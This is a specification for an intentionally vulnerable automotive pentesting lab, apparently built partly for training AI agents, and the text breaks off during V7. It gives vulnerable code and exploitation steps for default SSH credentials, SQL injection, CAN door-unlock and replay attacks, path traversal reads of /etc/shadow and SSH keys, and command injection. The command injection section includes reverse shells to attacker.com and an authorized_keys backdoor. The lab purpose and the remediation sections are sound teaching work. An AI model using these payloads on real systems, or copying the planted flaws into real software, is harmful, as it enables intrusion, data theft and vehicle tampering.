# Intentional Vulnerabilities Specification

## Overview

This document specifies the **12 intentional vulnerabilities** built into the automotive pentesting VM. Each vulnerability is designed to be:
- **Discoverable** by standard pentesting tools (nmap, Burp, fuzzing tools, etc.)
- **Exploitable** through well-known techniques
- **Realistic** to automotive/embedded systems
- **Educational** for both AI training and human learning
- **Safe** (contained, no real-world risk)

**Difficulty Progression**: Easy → Medium → Hard

**Note**: V9-V12 are fuzzing vulnerabilities that require automated testing tools (Boofuzz, Radamsa, python-can) to discover.

---

## Vulnerability Matrix

| ID | Name | Location | Difficulty | Discovery Tool | Exploitation Tool | Impact | AI Can Solve? |
|----|------|----------|------------|----------------|-------------------|--------|---------------|
| V1 | Default SSH Credentials | Gateway :22 | Easy | nmap, manual | SSH client | Shell access | Yes (High confidence) |
| V2 | SQL Injection | Infotainment :8000 | Easy | Manual, SQLMap | Burp, curl | Auth bypass | Yes (High confidence) |
| V2-B | Blind SQL Injection | Infotainment :8000 | Advanced | Manual, SQLMap | Burp, curl | Data extraction | Yes (Medium confidence) |
| V3 | CAN Bus - No Auth | vcan0 | Easy | candump | cansend | Vehicle control | Yes (High confidence) |
| V4 | CAN Replay Attack | vcan0 | Easy | candump | canplayer | Repeat actions | Yes (High confidence) |
| V5 | Directory Traversal (WAF Bypass) | Gateway :8080 | Medium-Hard | Manual, fuzzing | curl, Burp | File read | Yes (Medium confidence) |
| V6 | Command Injection | Infotainment :8000 | Medium | Manual, fuzzing | Burp, curl | RCE | Yes (Medium confidence) |
| V6-V2 | Vulnerability Chain | Infotainment :8000 | Medium | Manual | Burp, curl | Multi-stage | Yes (Medium confidence) |
| V7 | IDOR | Infotainment :8000 | Medium | Manual | Burp, curl | Data access | Yes (Medium confidence) |
| V8 | OBD Buffer Overflow | OBD :9555 | Hard | Fuzzing, manual | Custom exploit | Service crash | Yes (Low confidence) |
| V9 | UDS Security Bypass | UDS :9556 / vcan0 | Hard | Boofuzz | Protocol fuzzing | Auth bypass | Fuzzing required |
| V10 | CAN DLC Overflow | vcan0 | Hard | python-can | CAN fuzzing | Service crash | Fuzzing required |
| V11 | UDS Integer Overflow | UDS :9556 / vcan0 | Hard | Boofuzz | Protocol fuzzing | Buffer overflow | Fuzzing required |
| V12 | Firmware Header Overflow | UDS :9556 / vcan0 | Hard | Radamsa, Boofuzz | Format fuzzing | Buffer overflow | Fuzzing required |

**Note**: V9-V12 are fuzzing vulnerabilities that require automated testing tools to discover. They are not discoverable through manual inspection.

---

## V1: SSH Default Credentials

### Description
The gateway service runs SSH with manufacturer default credentials that were never changed during deployment.

### Technical Details

**Service**: OpenSSH 8.2p1  
**Port**: 22  
**Credentials**: 
- Username: `admin`
- Password: `password123`

**Additional weak credentials** (for AI to discover):
- `root` / `toor`
- `admin` / `admin`
- `tech` / `tech123`

### Why This is Realistic

**Real-world examples**:
- Jeep Cherokee hack (2015) - Default Telnet credentials on uConnect system
- Tesla Model S (2016) - Default SSH password on infotainment unit
- Many IoT devices ship with `admin/admin` or similar

Automotive manufacturers often:
- Use default credentials during development
- Forget to change them in production
- Document them in publicly available service manuals

### Discovery

**Method 1 - Banner Grabbing**:
```bash
nmap -sV -p 22 localhost
# Returns: 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
```

**Method 2 - Manual Connection**:
```bash
ssh admin@localhost
# Prompts for password (try common defaults)
```

**Method 3 - Automated Scanning**:
```bash
# Using Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS localhost
set USERNAME admin
set PASS_FILE /usr/share/wordlists/common_passwords.txt
run
```

**AI Discovery Path**:
```
1. Run nmap → discovers SSH on port 22
2. Reason: "SSH often has default credentials in embedded systems"
3. Try common combinations: admin/admin, admin/password, admin/password123
4. Success on admin/password123
```

### Exploitation

**Manual**:
```bash
ssh admin@localhost
# Password: password123
# Result: Shell access as admin user
```

**Scripted**:
```python
import paramiko

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    client.connect('localhost', username='admin', password='password123')
    stdin, stdout, stderr = client.exec_command('whoami')
    print(f"Logged in as: {stdout.read().decode()}")
except:
    print("Authentication failed")
```

### Impact

**Severity**: CRITICAL  
**CVSS Score**: 9.8 (Critical)

**Attacker Capabilities**:
- Full shell access to gateway system
- Read sensitive files (`/etc/passwd`, `/etc/shadow`)
- Access to CAN interface (`/dev/vcan0`)
- Potential to pivot to other systems
- Install backdoors for persistence
- Modify system configurations

### Remediation (For Documentation)
```bash
# Change default password
passwd admin

# Disable password authentication, use keys only
# Edit /etc/ssh/sshd_config:
PasswordAuthentication no
PubkeyAuthentication yes

# Restart SSH
systemctl restart sshd
```

### Validation

**API Endpoint**:
```bash
curl http://localhost:9999/validate/ssh_access
# Returns: {"success": true, "details": {"ssh_logins": ["Accepted password for admin from ..."]}}
```

**Manual Check**:
```bash
# Check sshd log for successful admin logins
grep "Accepted password for admin\|Accepted publickey for admin" /var/log/automotive-pentest/sshd.log
# Should show accepted login entries
```

---

## V2: SQL Injection in Login

### Description
The infotainment system's login form is vulnerable to SQL injection due to unsanitized user input being directly concatenated into SQL queries.

### Technical Details

**Location**: `http://localhost:8000/login`  
**Method**: POST  
**Parameters**: `username`, `password`

**Vulnerable Code** (app.py):
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # VULNERABLE: Direct string concatenation
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    
    cursor = db.execute(query)
    user = cursor.fetchone()
    
    if user:
        session['user_id'] = user[0]
        return redirect('/dashboard')
    else:
        return "Invalid credentials", 401
```

### Why This is Realistic

**Real-world examples**:
- BMW ConnectedDrive (2016) - SQLi in dealer portal
- Nissan Leaf (2016) - SQLi in mobile app backend
- Multiple automotive supplier portals vulnerable to SQLi

Automotive web interfaces often:
- Use legacy code from non-security-focused developers
- Lack input validation
- Trust input from "trusted" networks (dealer networks, etc.)

### Discovery

**Method 1 - Manual Testing**:
```bash
# Test for SQLi by breaking the query
curl -X POST http://localhost:8000/login \
  -d "username=admin'&password=test"

# If error message appears showing SQL syntax error, SQLi likely exists
```

**Method 2 - Automated Scanning**:
```bash
# Using SQLMap
sqlmap -u "http://localhost:8000/login" \
  --data "username=test&password=test" \
  --level 3 --risk 3
```

**Method 3 - Burp Suite**:
```
1. Capture login POST request in Burp
2. Send to Intruder
3. Set payload position: username=§test§
4. Use SQLi payload list
5. Analyze responses for successful authentication
```

**AI Discovery Path**:
```
1. Discover web app on port 8000
2. Identify login form
3. Reason: "Web login forms are commonly vulnerable to SQLi"
4. Test basic payload: ' OR '1'='1' --
5. Success: Authenticated without valid credentials
```

### Exploitation

**Payload 1 - Authentication Bypass**:
```bash
curl -X POST http://localhost:8000/login \
  -d "username=' OR '1'='1' --&password=anything"

# Explanation:
# Becomes: SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
# The -- comments out the password check
# '1'='1' is always true, so first user (admin) is returned
```

**Payload 2 - Specific User Login**:
```bash
curl -X POST http://localhost:8000/login \
  -d "username=admin' --&password=ignored"

# Becomes: SELECT * FROM users WHERE username='admin' --' AND password='ignored'
# Logs in as admin specifically
```

**Payload 3 - Data Extraction** (Advanced):
```bash
# Extract all usernames
curl -X POST http://localhost:8000/login \
  -d "username=' UNION SELECT username, password, NULL, NULL FROM users --&password=x"

# Or use SQLMap for automated extraction
sqlmap -u "http://localhost:8000/login" \
  --data "username=test&password=test" \
  --dump -T users
```

### Impact

**Severity**: HIGH  
**CVSS Score**: 8.6 (High)

**Attacker Capabilities**:
- Bypass authentication (access any account)
- Extract sensitive data (usernames, passwords, VINs)
- Potentially modify data (INSERT, UPDATE, DELETE)
- Access admin functions
- View other users' personal information

**Extracted Data Example**:
```sql
-- Database contents
id | username | password  | role  | vin
1  | admin    | admin123  | admin | 1HGBH41JXMN109186
2  | driver   | password  | user  | 1HGBH41JXMN109186
3  | owner    | car123    | user  | 2HGES16534H532890
```

### Remediation (For Documentation)

**Secure Code** (use parameterized queries):
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # SECURE: Parameterized query
    query = "SELECT * FROM users WHERE username=? AND password=?"
    cursor = db.execute(query, (username, password))
    user = cursor.fetchone()
    
    if user:
        session['user_id'] = user[0]
        return redirect('/dashboard')
    else:
        return "Invalid credentials", 401
```

### Validation

**API Endpoint**:
```bash
curl http://localhost:9999/validate/sqli_success
# Returns: {"success": true, "bypassed_auth": true}
```

**Manual Check**:
```bash
# Try to access protected page after SQLi
curl -b cookies.txt http://localhost:8000/dashboard
# Should show admin dashboard
```

---

## V3: CAN Bus - No Authentication

### Description
CAN messages on the vehicle bus have no authentication mechanism. Any device with access to the bus can send arbitrary commands.

### Technical Details

**Interface**: vcan0  
**Protocol**: CAN 2.0B  
**Message Format**: `[ID] [DLC] [DATA]`

**Critical CAN IDs**:
```
0x244 - Vehicle Speed
0x166 - Engine RPM  
0x19B - Door Locks (last 4 bytes control lock state)
0x188 - Turn Signals
```

**Door Lock Message**:
```
ID: 0x19B
DLC: 8 bytes
Data: [XX XX XX XX] [DOOR_STATE]
      └─ Padding ─┘  └─ Locks ─┘

Door State Encoding:
00 00 00 00 = All locked
FF FF FF FF = All unlocked
```

### Why This is Realistic

**Real-world examples**:
- ALL vehicles pre-2020s lack CAN authentication
- CAN bus was designed in 1980s for internal use only
- No security was considered (trusted network assumption)
- Modern vehicles still widely use unauthenticated CAN

**Industry Reality**:
- ISO 11898 (CAN standard) has no security provisions
- Authentication proposals (CANAuth, LeiA) not widely adopted
- Automotive Ethernet moving to authenticated protocols (SOME/IP)
- Legacy CAN remains vulnerable in billions of vehicles

### Discovery

**Method 1 - Interface Discovery**:
```bash
# List network interfaces
ip link show | grep vcan

# Output:
# 3: vcan0: <NOARP,UP,LOWER_UP> mtu 72 qdisc noqueue state UNKNOWN
```

**Method 2 - Traffic Observation**:
```bash
# Monitor CAN traffic
candump vcan0

# Output:
# vcan0  244  [8]  00 00 00 00 00 00 00 00
# vcan0  19B  [8]  00 00 00 00 00 00 00 00  ← Door locks
# vcan0  166  [8]  00 00 1A F8 00 00 00 00
```

**AI Discovery Path**:
```
1. Gain shell access (via SSH)
2. Run: ip link show
3. Discover vcan0 interface
4. Reason: "CAN interfaces in automotive systems control vehicle functions"
5. Run: candump vcan0
6. Observe traffic patterns
7. Identify door lock messages (ID 19B)
8. Reason: "No authentication visible in message format"
```

### Exploitation

**Method 1 - Direct Command**:
```bash
# Unlock all doors
cansend vcan0 19B#00000000FFFFFFFF

# Lock all doors
cansend vcan0 19B#0000000000000000
```

**Method 2 - Scripted Attack**:
```python
import can
import time

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

# Unlock doors
unlock_msg = can.Message(
    arbitration_id=0x19B,
    data=[0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF],
    is_extended_id=False
)

bus.send(unlock_msg)
print("Doors unlocked!")
```

**Method 3 - Fuzzing**:
```bash
# Send random data to discover effects
cangen vcan0 -I 19B -D r -L 8
```

### Impact

**Severity**: HIGH  
**CVSS Score**: 7.5 (High)

**Attacker Capabilities**:
- Unlock doors remotely
- Control turn signals
- Potentially affect speed/RPM displays
- Trigger false warnings
- Disable safety systems

**Attack Scenarios**:
1. **Theft**: Unlock doors, start engine (if ECU vulnerable)
2. **Harassment**: Repeatedly lock/unlock doors
3. **Safety**: Confuse driver with false speed readings
4. **DoS**: Flood bus to prevent legitimate messages

### Remediation (For Documentation)

**Option 1 - Message Authentication Codes (MAC)**:
```python
import hmac
import hashlib

SECRET_KEY = b'automotive_secret_key'

def send_authenticated_message(bus, arb_id, data):
    # Calculate MAC
    mac = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()[:4]
    
    # Append MAC to message
    authenticated_data = data + mac
    
    msg = can.Message(arbitration_id=arb_id, data=authenticated_data)
    bus.send(msg)
```

**Option 2 - Encrypted CAN** (SecOC - Secure Onboard Communication):
```
Implement encryption at CAN layer (requires hardware support)
```

### Validation

**API Endpoint**:
```bash
curl http://localhost:9999/status
# Returns:
# {
#   "can": {
#     "doors": {
#       "fl": true,  ← Front left unlocked
#       "fr": true,  ← Front right unlocked
#       "rl": true,  ← Rear left unlocked
#       "rr": true   ← Rear right unlocked
#     }
#   }
# }

curl http://localhost:9999/validate/doors_unlocked
# Returns: {"success": true}
```

**Visual Check**:
- Open ICSim dashboard
- All 4 door indicators should show "unlocked" state

---

## V4: CAN Replay Attack

### Description
CAN messages can be recorded and replayed later to repeat actions, since there's no timestamp or sequence number validation.

### Technical Details

**Attack Type**: Replay Attack  
**Prerequisites**: Access to CAN bus (physical or via compromised ECU)  
**Tools**: candump, canplayer

### Why This is Realistic

**Real-world examples**:
- RollJam device (keyless entry replay)
- Researchers replayed CAN messages to unlock Tesla Model S
- Replay attacks demonstrated on multiple vehicle makes

**Why it works**:
- No timestamps in CAN messages
- No sequence numbers
- No session tokens
- Messages are stateless
- Receivers don't validate message freshness

### Discovery

**Observation**:
```bash
# Record normal operation
candump -l vcan0

# Perform action (e.g., press unlock on key fob)
# ICSim: Use controls to unlock doors

# Stop recording (Ctrl+C)
# File created: candump-2025-01-28_103045.log
```

**AI Discovery Path**:
```
1. Already monitoring CAN with candump
2. Observe user unlocking doors (or use controls)
3. See CAN message: 19B#00000000FFFFFFFF
4. Reason: "If I can replay this message, doors should unlock again"
5. Save message to file
6. Later: Replay the message
```

### Exploitation

**Method 1 - Simple Replay**:
```bash
# Step 1: Record traffic
candump -l vcan0
# ... perform action (unlock doors) ...
# Ctrl+C to stop

# Step 2: Lock doors again (manual or via controls)

# Step 3: Replay recorded traffic
canplayer -I candump-2025-01-28_103045.log

# Result: Doors unlock again
```

**Method 2 - Selective Replay**:
```bash
# Extract only the unlock message
grep "19B#00000000FFFFFFFF" candump-2025-01-28_103045.log > unlock_only.log

# Replay just the unlock command
canplayer -I unlock_only.log
```

**Method 3 - Scripted Replay**:
```python
import can
import time

# Read recorded message
with open('candump-2025-01-28_103045.log', 'r') as f:
    for line in f:
        if '19B' in line and 'FFFFFFFF' in line:
            # Parse the message
            parts = line.split()
            arb_id = int(parts[2], 16)  # 19B
            data_hex = parts[4].replace('[', '').replace(']', '')
            data = bytes.fromhex(data_hex.replace(' ', ''))
            
            # Replay the message
            bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
            msg = can.Message(arbitration_id=arb_id, data=data)
            bus.send(msg)
            print("Replayed unlock message!")
            break
```

### Impact

**Severity**: MEDIUM  
**CVSS Score**: 6.5 (Medium)

**Attacker Capabilities**:
- Unlock doors hours/days after recording legitimate unlock
- Reproduce any previously observed action
- Defeat time-based access controls
- Perform attacks without understanding message meaning

**Attack Scenarios**:
1. **Delayed Unlock**: Record owner unlocking car, replay at night to steal
2. **Parking Lot Attack**: Record unlock signals from multiple cars, replay later
3. **Persistent Access**: Record diagnostic unlock, replay indefinitely

### Remediation (For Documentation)

**Option 1 - Add Timestamps**:
```python
import time

def send_with_timestamp(bus, arb_id, data):
    timestamp = int(time.time()).to_bytes(4, 'big')
    data_with_ts = timestamp + data
    
    msg = can.Message(arbitration_id=arb_id, data=data_with_ts)
    bus.send(msg)

def validate_timestamp(received_msg):
    timestamp = int.from_bytes(received_msg.data[:4], 'big')
    now = int(time.time())
    
    # Reject if message is older than 5 seconds
    if now - timestamp > 5:
        return False
    return True
```

**Option 2 - Sequence Numbers**:
```python
sequence = 0

def send_with_sequence(bus, arb_id, data):
    global sequence
    sequence += 1
    seq_bytes = sequence.to_bytes(2, 'big')
    data_with_seq = seq_bytes + data
    
    msg = can.Message(arbitration_id=arb_id, data=data_with_seq)
    bus.send(msg)

# Receiver validates sequence increases monotonically
```

### Validation

**API Endpoint**:
```bash
curl http://localhost:9999/validate/can_replay
# Returns: {"success": true, "details": {"replay_detected": true}}
```

**How Detection Works**:

The Validation API monitors vcan0 for rapid bursts of identical door frames. When 5 or more identical CAN frames with ID 0x19B arrive within a 2-second window, a replay attack is flagged. This detects the characteristic pattern of captured-and-replayed traffic.

**Triggering Methods**:

```bash
# Method 1: Rapid replay of identical frames (simplest)
for i in $(seq 1 10); do cansend vcan0 19B#00000000FFFFFFFF; done

# Method 2: Capture and replay with canplayer
candump -l vcan0 &
cansend vcan0 19B#00000000FFFFFFFF
pkill candump
canplayer -I candump-*.log
```

**Manual Check**:
```bash
# Check gateway log for replay detection marker
grep "CAN_REPLAY_DETECTED" /var/log/automotive-pentest/gateway.log
```

---

## V5: Directory Traversal in Firmware Upload

### Description
The firmware upload endpoint doesn't sanitize filenames, allowing attackers to read arbitrary files using path traversal (`../../../etc/passwd`).

### Technical Details

**Location**: `http://localhost:8080/firmware/upload`  
**Method**: POST (multipart/form-data)  
**Parameter**: `file` (filename vulnerable)

**Vulnerable Code** (gateway_service.py):
```python
@app.route('/firmware/upload', methods=['POST'])
def firmware_upload():
    uploaded_file = request.files['file']
    filename = uploaded_file.filename  # User-controlled!
    
    # VULNERABLE: No sanitization of filename
    filepath = os.path.join('/var/firmware/', filename)
    
    # If filename is "../../etc/passwd", filepath becomes:
    # /var/firmware/../../etc/passwd → /etc/passwd
    
    with open(filepath, 'rb') as f:
        content = f.read()
        return f"File uploaded: {content.decode()}"
```

### Why This is Realistic

**Real-world examples**:
- BMW firmware update portal (2018) - Directory traversal
- Airbiquity OTA update system - Path traversal in filename
- Multiple automotive supplier portals vulnerable

**Common in automotive**:
- Firmware upload is common feature (OTA updates)
- Often developed by engineers without security training
- Legacy code ported from desktop applications
- Insufficient input validation

### Discovery

**Method 1 - Manual Testing**:
```bash
# Try basic traversal
curl -F "file=@test.bin;filename=../../../etc/passwd" \
  http://localhost:8080/firmware/upload
```

**Method 2 - Burp Suite**:
```
1. Capture upload request
2. Modify filename parameter
3. Test various traversal payloads:
   - ../../../etc/passwd
   - ..%2F..%2F..%2Fetc%2Fpasswd (URL encoded)
   - ....//....//....//etc/passwd (filter bypass)
```

**Method 3 - Automated Fuzzing**:
```bash
# Use ffuf with traversal wordlist
ffuf -w traversal-wordlist.txt \
  -X POST \
  -H "Content-Type: multipart/form-data" \
  -d "file=@test.bin;filename=FUZZ" \
  -u http://localhost:8080/firmware/upload
```

**AI Discovery Path**:
```
1. Discover HTTP service on port 8080 (via nmap)
2. Explore endpoints manually
3. Find /firmware/upload
4. Reason: "File upload endpoints often vulnerable to traversal"
5. Test: filename="../../../etc/passwd"
6. Success: Contents of /etc/passwd returned
```

### Exploitation

**Read Sensitive Files**:
```bash
# /etc/passwd (user accounts)
curl -F "file=@dummy.bin;filename=../../../etc/passwd" \
  http://localhost:8080/firmware/upload

# /etc/shadow (password hashes) - if running as root
curl -F "file=@dummy.bin;filename=../../../etc/shadow" \
  http://localhost:8080/firmware/upload

# SSH private keys
curl -F "file=@dummy.bin;filename=../../../root/.ssh/id_rsa" \
  http://localhost:8080/firmware/upload

# Application configuration
curl -F "file=@dummy.bin;filename=../../infotainment/database.db" \
  http://localhost:8080/firmware/upload
```

**Python Script**:
```python
import requests

def read_file_via_traversal(target_file):
    files = {
        'file': ('dummy.bin', b'AAAA', 'application/octet-stream')
    }
    
    # Manipulate filename in the Content-Disposition header
    response = requests.post(
        'http://localhost:8080/firmware/upload',
        files=files,
        data={'filename': f'../../../{target_file}'}
    )
    
    return response.text

# Read /etc/passwd
passwd_content = read_file_via_traversal('etc/passwd')
print(passwd_content)
```

### Impact

**Severity**: MEDIUM-HIGH  
**CVSS Score**: 7.5 (High)

**Attacker Capabilities**:
- Read any file the web server can access
- Extract sensitive configuration files
- Retrieve database files
- Access private keys
- Gather intelligence for further attacks

**Sensitive Files in Automotive Context**:
```
/etc/passwd                          # User accounts
/var/firmware/update.bin             # Legitimate firmware
/opt/automotive-pentest/infotainment/database.db  # User data
/root/.ssh/id_rsa                    # SSH keys
/var/log/automotive-pentest/*.log    # Logs revealing system info
/etc/ssl/private/vehicle-cert.pem    # TLS certificates
```

### Remediation (For Documentation)

**Secure Code**:
```python
import os
from werkzeug.utils import secure_filename

@app.route('/firmware/upload', methods=['POST'])
def firmware_upload():
    uploaded_file = request.files['file']
    
    # SECURE: Sanitize filename
    filename = secure_filename(uploaded_file.filename)
    
    # SECURE: Use absolute path and validate
    upload_dir = '/var/firmware/'
    filepath = os.path.join(upload_dir, filename)
    
    # SECURE: Ensure the resolved path is still within upload_dir
    if not os.path.abspath(filepath).startswith(os.path.abspath(upload_dir)):
        return "Invalid filename", 400
    
    uploaded_file.save(filepath)
    return "File uploaded successfully"
```

### Validation

**API Endpoint**:
```bash
curl http://localhost:9999/validate/directory_traversal
# Returns: {"success": true, "files_read": ["/etc/passwd"]}
```

**Manual Check**:
```bash
# Try to read /etc/passwd
curl -F "file=@test.bin;filename=../../../etc/passwd" \
  http://localhost:8080/firmware/upload

# If successful, should see contents of /etc/passwd in response
```

---

## V6: Command Injection in Media Upload

### Description
The media upload feature processes filenames unsafely, allowing OS command injection through specially crafted filenames.

### Technical Details

**Location**: `http://localhost:8000/upload`  
**Method**: POST (multipart/form-data)  
**Vulnerable Parameter**: filename

**Vulnerable Code** (infotainment/app.py):
```python
@app.route('/upload', methods=['POST'])
def upload_media():
    uploaded_file = request.files['file']
    filename = uploaded_file.filename
    
    # Save file temporarily
    temp_path = f"/tmp/{filename}"
    uploaded_file.save(temp_path)
    
    # VULNERABLE: Unsanitized filename in shell command
    os.system(f"ffmpeg -i {temp_path} /var/media/converted.mp4")
    
    return "Media processed successfully"
```

**Example Attack**:
```
Filename: "test.jpg; whoami #.jpg"
Command becomes: ffmpeg -i /tmp/test.jpg; whoami #.jpg /var/media/converted.mp4
Executes: ffmpeg -i /tmp/test.jpg; whoami
          (# comments out the rest)
```

### Why This is Realistic

**Real-world examples**:
- Honda/Acura infotainment - Command injection in media player
- Multiple aftermarket head units vulnerable
- IoT devices (dash cams, etc.) vulnerable to filename injection

**Common patterns**:
- Infotainment systems process user-uploaded media
- Often use external tools (ffmpeg, ImageMagick)
- Legacy code uses `os.system()` instead of safe alternatives
- Filename validation often overlooked

### Discovery

**Method 1 - Manual Testing**:
```bash
# Test basic injection
curl -F "file=@test.jpg" \
  -F "filename=test.jpg; id #.jpg" \
  http://localhost:8000/upload

# Look for command output in response
```

**Method 2 - Out-of-Band Detection**:
```bash
# Use reverse shell or DNS exfiltration
curl -F "file=@test.jpg" \
  -F "filename=test.jpg; nslookup attacker.com #.jpg" \
  http://localhost:8000/upload

# Monitor DNS logs for lookup
```

**Method 3 - Burp Suite**:
```
1. Capture upload request
2. Send to Repeater
3. Modify filename parameter
4. Test payloads:
   - test.jpg; id #.jpg
   - test.jpg`whoami`.jpg
   - test.jpg$(whoami).jpg
   - test.jpg| whoami #.jpg
```

**AI Discovery Path**:
```
1. Discover upload functionality on port 8000
2. Test legitimate upload (succeeds)
3. Reason: "If backend processes files, might use shell commands"
4. Test: filename="test.jpg; id #.jpg"
5. Observe command output in response or logs
6. Escalate to reverse shell
```

### Exploitation

**Payload 1 - Information Gathering**:
```bash
# Execute 'id' command
curl -F "file=@test.jpg" \
  -F "filename=test.jpg; id #.jpg" \
  http://localhost:8000/upload

# Execute 'whoami'
curl -F "file=@test.jpg" \
  -F "filename=test.jpg; whoami #.jpg" \
  http://localhost:8000/upload
```

**Payload 2 - File Exfiltration**:
```bash
# Read /etc/passwd
curl -F "file=@test.jpg" \
  -F "filename=test.jpg; cat /etc/passwd #.jpg" \
  http://localhost:8000/upload
```

**Payload 3 - Reverse Shell**:
```bash
# Netcat reverse shell
curl -F "file=@test.jpg" \
  -F "filename=test.jpg; nc -e /bin/bash attacker.com 4444 #.jpg" \
  http://localhost:8000/upload

# Or Python reverse shell (more reliable)
curl -F "file=@test.jpg" \
  -F "filename=test.jpg; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' #.jpg" \
  http://localhost:8000/upload
```

**Payload 4 - Persistent Backdoor**:
```bash
# Add SSH key for persistence
curl -F "file=@test.jpg" \
  -F "filename=test.jpg; echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys #.jpg" \
  http://localhost:8000/upload
```

**Python Exploit Script**:
```python
import requests

def command_injection(command):
    """Execute arbitrary command via filename injection"""
    
    # Craft malicious filename
    filename = f"test.jpg; {command} #.jpg"
    
    files = {
        'file': ('payload.jpg', b'\xff\xd8\xff\xe0', 'image/jpeg')
    }
    data = {
        'filename': filename
    }
    
    response = requests.post(
        'http://localhost:8000/upload',
        files=files,
        data=data
    )
    
    return response.text

# Test
result = command_injection("whoami")
print(f"Command output: {result}")

# Establish reverse shell
command_injection("bash -i >& /dev/tcp/attacker.com/4444 0>&1")
```

### Impact

**Severity**: CRITICAL  
**CVSS Score**: 9.8 (Critical)

**Attacker Capabilities**:
- Execute arbitrary OS commands
- Full system compromise
- Install backdoors
- Pivot to other systems
- Access CAN bus (if web app runs with sufficient privileges)
- Exfiltrate data
- Deploy malware/ransomware

**Attack Progression**:
```
1. Command injection → RCE
2. Establish reverse shell
3. Enumerate system (find CAN interface)
4. Control vehicle via CAN commands
5. Install persistent backdoor
6. Maintain long-term access
```

### Remediation (For Documentation)

**Option 1 - Use subprocess with list arguments**:
```python
import subprocess

@app.route('/upload', methods=['POST'])
def upload_media():
    uploaded_file = request.files['file']
    filename = secure_filename(uploaded_file.filename)  # Sanitize first
    
    temp_path = f"/tmp/{filename}"
    uploaded_file.save(temp_path)
    
    # SECURE: Use list arguments (no shell interpretation)
    subprocess.run([
        "ffmpeg",
        "-i", temp_path,
        "/var/media/converted.mp4"
    ], check=True)
    
    return "Media processed successfully"
```

**Option 2 - Strict filename validation**:
```python
import re

def validate_filename(filename):
    # Allow only alphanumeric, dots, dashes, underscores
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError("Invalid filename")
    
    # Limit length
    if len(filename) > 255:
        raise ValueError("Filename too long")
    
    # Check extension whitelist
    allowed_extensions = ['jpg', 'jpeg', 'png', 'mp4', 'mp3']
    ext = filename.rsplit('.', 1)[-1].lower()
    if ext not in allowed_extensions:
        raise ValueError("File type not allowed")
    
    return filename
```

### Validation

**API Endpoint**:
```bash
curl http://localhost:9999/validate/command_injection
# Returns: {"success": true, "commands_executed": ["whoami"]}
```

**Manual Check**:
```bash
# Test if command executed
curl -F "file=@test.jpg" \
  -F "filename=test.jpg; touch /tmp/pwned #.jpg" \
  http://localhost:8000/upload

# Then check if file was created
ssh admin@localhost "ls /tmp/pwned"
# If file exists, command injection successful
```

---

## V7: Insecure Direct Object Reference (IDOR)

### Description
The settings page allows users to access other users' settings by manipulating the `user_id` parameter in the URL.

### Technical Details

**Location**: `http://localhost:8000/settings?user_id=1`  
**Method**: GET  
**Vulnerable Parameter**: `user_id`

**Vulnerable Code** (infotainment/app.py):
```python
@app.route('/settings')
def settings():
    # VULNERABLE: No authorization check
    user_id = request.args.get('user_id', session.get('user_id'))
    
    # Directly uses user-supplied ID
    user = db.execute("SELECT * FROM users WHERE id=?", (user_id,)).fetchone()
    
    return render_template('settings.html', user=user)
```

**Issue**: The application doesn't verify that the logged-in user should have access to the requested `user_id`.

### Why This is Realistic

**Real-world examples**:
- GM OnStar - Could access other users' vehicle data via ID manipulation
- Multiple connected car apps - IDOR in API endpoints
- Automotive service portals - Access other customers' repair records

**Common in automotive**:
- Mobile apps often use numeric IDs
- Sequential IDs are predictable
- Authorization checks often missing
- "Security by obscurity" assumption (users won't guess IDs)

### Discovery

**Method 1 - Manual Testing**:
```bash
# Log in as user ID 2
curl -c cookies.txt -X POST http://localhost:8000/login \
  -d "username=driver&password=password"

# Access own settings (user_id=2)
curl -b cookies.txt "http://localhost:8000/settings?user_id=2"
# Returns: driver's settings

# Try to access another user's settings (user_id=1)
curl -b cookies.txt "http://localhost:8000/settings?user_id=1"
# Returns: admin's settings (IDOR vulnerability!)
```

**Method 2 - Burp Suite**:
```
1. Log in as regular user
2. Navigate to /settings
3. Note current user_id parameter
4. Send to Repeater
5. Change user_id to different values (1, 2, 3, ...)
6. Observe if other users' data is returned
```

**Method 3 - Automated Enumeration**:
```bash
# Iterate through user IDs
for i in {1..100}; do
  curl -b cookies.txt "http://localhost:8000/settings?user_id=$i" \
    >> idor_results.txt
done

# Analyze results for successful data retrieval
```

**AI Discovery Path**:
```
1. Already logged into web app (via SQLi or legitimate login)
2. Navigate to /settings page
3. Observe URL: /settings?user_id=2
4. Reason: "Numeric ID parameters often vulnerable to IDOR"
5. Test: Change user_id=2 to user_id=1
6. Success: Admin's settings displayed
7. Iterate through IDs to enumerate all users
```

### Exploitation

**Scenario 1 - Data Enumeration**:
```bash
#!/bin/bash
# Enumerate all users' data

for user_id in {1..10}; do
  echo "=== User ID: $user_id ==="
  curl -s -b cookies.txt \
    "http://localhost:8000/settings?user_id=$user_id" \
    | grep -E "(username|email|vin|phone)"
done
```

**Scenario 2 - Targeted Access**:
```python
import requests

session = requests.Session()

# Log in as regular user
session.post('http://localhost:8000/login', data={
    'username': 'driver',
    'password': 'password'
})

# Access admin's settings (user_id=1)
response = session.get('http://localhost:8000/settings?user_id=1')

if 'admin' in response.text:
    print("Successfully accessed admin's settings!")
    print(response.text)
```

**Scenario 3 - Modify Other Users' Settings** (if PUT/POST vulnerable):
```bash
# If the endpoint also allows modifications
curl -X POST -b cookies.txt \
  "http://localhost:8000/settings?user_id=1" \
  -d "email=attacker@evil.com"

# Now admin's email is changed to attacker's
```

### Impact

**Severity**: MEDIUM  
**CVSS Score**: 6.5 (Medium)

**Attacker Capabilities**:
- Access other users' personal information
- View VINs of other vehicles
- See contact information
- View usage patterns/preferences
